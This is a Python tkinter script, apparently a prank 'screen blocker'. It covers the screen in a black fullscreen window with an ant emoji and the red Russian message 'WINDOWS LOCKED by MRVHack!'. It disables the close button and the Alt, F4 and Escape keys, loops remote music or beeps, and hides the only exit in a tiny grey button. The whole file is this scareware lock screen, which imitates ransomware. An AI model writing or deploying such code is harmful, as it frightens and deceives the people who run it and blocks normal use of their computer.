import tkinter as tk
import sys
import threading

def play_music():
    try:
        import pygame
        pygame.mixer.init()
        from io import BytesIO
        import requests
        url = "https://image2url.com/r2/default/audio/1775422363740-b372aca7-1e6c-46cc-b559-88fc585c9b8a.mp3"
        response = requests.get(url, timeout=5)
        sound_file = BytesIO(response.content)
        pygame.mixer.music.load(sound_file)
        pygame.mixer.music.play(-1)
    except:
        try:
            import winsound
            def beep_loop():
                while True:
                    winsound.Beep(440, 500)
                    threading.Event().wait(1)
            threading.Thread(target=beep_loop, daemon=True).start()
        except:
            pass

def demo_blocker():
    root = tk.Tk()
    root.title("")
    root.geometry("800x600")
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    
    def exit_demo():
        try:
            import pygame
            pygame.mixer.music.stop()
        except:
            pass
        root.destroy()
        sys.exit(0)
    
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Запуск музыки
    threading.Thread(target=play_music, daemon=True).start()
    
    # Большой смайл муравья
    ant_label = tk.Label(
        root, 
        text="🐜", 
        font=("Segoe UI Emoji", 120), 
        bg='black', 
        fg='white'
    )
    ant_label.pack(pady=40)
    
    # Текст
    label = tk.Label(
        root, 
        text="WINDOWS ЗАБЛОКИРОВАН by MRVHack!", 
        font=("Arial", 36, "bold"), 
        fg="red", 
        bg="black"
    )
    label.pack(expand=True)
    
    # Маленькая серая кнопка выхода
    btn_exit = tk.Button(
        root, 
        text="выход", 
        command=exit_demo,
        font=("Arial", 8),
        bg="#404040",
        fg="#606060",
        activebackground="#404040",
        activeforeground="#606060",
        relief=tk.FLAT,
        borderwidth=0,
        padx=3,
        pady=1
    )
    btn_exit.place(x=760, y=570, width=30, height=15)
    
    def on_keypress(event):
        if event.keysym in ('Alt_L', 'Alt_R', 'F4', 'Escape'):
            return "break"
    
    root.bind_all('<Key>', on_keypress)
    root.mainloop()

if __name__ == "__main__":
    demo_blocker()